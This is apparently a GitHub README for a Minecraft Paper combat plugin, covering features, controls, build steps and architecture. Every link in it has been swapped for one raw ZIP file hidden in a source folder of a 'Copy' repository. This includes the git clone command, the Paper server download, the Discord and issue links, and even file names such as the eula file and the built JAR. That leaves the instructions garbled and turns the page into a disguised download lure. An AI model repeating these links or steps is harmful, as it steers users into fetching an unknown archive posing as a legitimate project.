# Sword: Combat Evolved

[![Paper](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip+-00ADD8?style=for-the-badge&logo=minecraft)](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)
[![Java](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip+-orange?style=for-the-badge&logo=openjdk)](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)
[![License](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip%202.0-blue?style=for-the-badge)](LICENSE)
[![Discord](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)
[![Build](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)

An advanced Minecraft combat system featuring throwing mechanics, entity interactions, combo
attacks, and RPG-style stats. Built for Paper 1.21+.

## Features

- **Combo Combat System**: Chain attacks together with input sequences
- **Throwing Mechanics**: Throw swords, items, and even grabbed entities
- **Advanced Movement**: Dash forward/backward, air dodges, and momentum-based combat
- **RPG Stat System**: Aspects (stats) and Resources with regeneration
- **Entity Grabbing**: Grab and throw enemies mid-combat
- **Custom AI**: Hostile NPCs with pathfinding and combat behaviors
- **Bézier Curve Attacks**: Smooth, dynamic attack animations

## Requirements

- **Minecraft Version**: 1.21+
- **Server**: Paper (or compatible fork)
- **Java**: 21+
- **Build Tool**: Gradle 8.8+

## Quick Start

### Using Gradle (Recommended)

```bash
# Clone the repository
git clone https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip
cd Sword-Combat-Plugin

# Build the plugin
./gradlew build

# Run test server (automatically downloads Paper and starts server)
./gradlew runServer
```

The plugin JAR will be at: `https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip`

### Manual Setup

1. **Download Paper Server**

    - Get Paper 1.21+ from <https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip>
    - Place in a server directory

2. **Accept EULA**

    - Run the server jar once to generate `https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip`
    - Change `eula=false` to `eula=true`

3. **Build Plugin**

   ```bash
   ./gradlew build
   ```

4. **Install Plugin**

    - Copy `https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip` to `server/plugins/`
    - Start the server

5. **Connect**
    - Launch Minecraft 1.21
    - Direct Connect to `localhost` or `0`

## Controls

Note: *Must be holding a shield in offhand for right clicking functionality*

| Action                   | Input                       | Description                                        |
| ------------------------ |-----------------------------| -------------------------------------------------- |
| **Attack Combo**         | `Left → Left → Left`        | Three-hit attack combo                             |
| **Throw Item**           | `Drop → Right → Hold Right` | Throw non-consumable items                         |
| **Grab Entity/Sword**    | `Shift → Left`              | Pull lodged sword or grab enemy                    |
| **Throw Grabbed Entity** | `Swap`                      | Hurl the grabbed entity                            |
| **Dash Forward**         | `Swap Item → Swap Item`     | Quick forward dash                                 |
| **Dash Backward**        | `Shift → Shift`             | Quick backward dash                                |
| **Dash to Thrown Sword** | Dash while targeting sword  | Dash to lodged sword and retrieve it automatically |

## Development

### Project Structure

```
src/main/java/btm/sword/
├── commands/         # Command handlers
├── listeners/        # Event listeners
├── system/
│   ├── action/      # Combat actions and skills
│   ├── combat/      # Combat mechanics (afflictions, etc.)
│   ├── entity/      # Entity wrappers and AI
│   ├── input/       # Input combo system
│   ├── item/        # Custom item handling
│   └── playerdata/  # Player data persistence
└── util/            # Utility classes (vectors, bezier, etc.)
```

### Building

```bash
# Build JAR
./gradlew build

# Run tests
./gradlew test

# Check code style
./gradlew checkstyleMain

# Auto-fix formatting
./gradlew spotlessApply

# Run all checks
./gradlew check
```

### Testing

```bash
# Run test suite
./gradlew test

# View test report
open https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip
```

### Code Quality

The project uses multiple linters and quality tools:

- **Checkstyle**: Style and conventions
- **PMD**: Bug detection
- **Spotless**: Auto-formatting (Java + Markdown)

See [https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip) for details.

### Documentation

- **[Testing Guide](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)**: How to write and run tests
- **[Linting Guide](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)**: Code quality tools and usage
- **[Contributing](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)**: Contribution guidelines
- **[Documentation Standards](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)**: Javadoc guidelines

## Architecture

### Entity System

- **SwordEntity**: Base class for all combat entities
- **Combatant**: Adds combat capabilities (attacking, grabbing, dashing)
- **SwordPlayer**: Player-specific implementation with input handling
- **Hostile**: AI-controlled enemies with pathfinding
- **Passive**: Non-hostile NPCs

### Input System

Combo attacks are detected using a tree-based finite state machine (`InputExecutionTree`) that
tracks input sequences and triggers actions with cooldowns.

## Current Status

**Active Development** - Many features are work-in-progress:

**Completed:**

- Basic combat and throwing mechanics
- Input combo system
- Entity grabbing and throwing
- RPG stat system
- Player data persistence

**In Progress:**

- AI behaviors (basic implementation)
- Skill system (in development)
- Advanced abilities

**Planned:**

- More weapon types
- Visual effects
- Dungeons and encounters

## Contributing

Contributions are welcome! This is a work in progress with many features yet to be implemented.

### Getting Started

1. **Setup Development Environment**
   - See [Development Environment Setup](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip) for Java 21 and IDE configuration
   - Includes troubleshooting for common setup issues

2. **Read Guidelines**
   - See [https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip) for:
     - Code style and formatting
     - Submitting pull requests
     - Reporting issues
     - Development workflow

## Contact & Community

- **Discord**: <https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip>
- **Issues**: <https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip>

## License

This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.

## Acknowledgments

Built for Paper/Spigot Minecraft servers. Uses modern Java combat mechanics and RPG design patterns.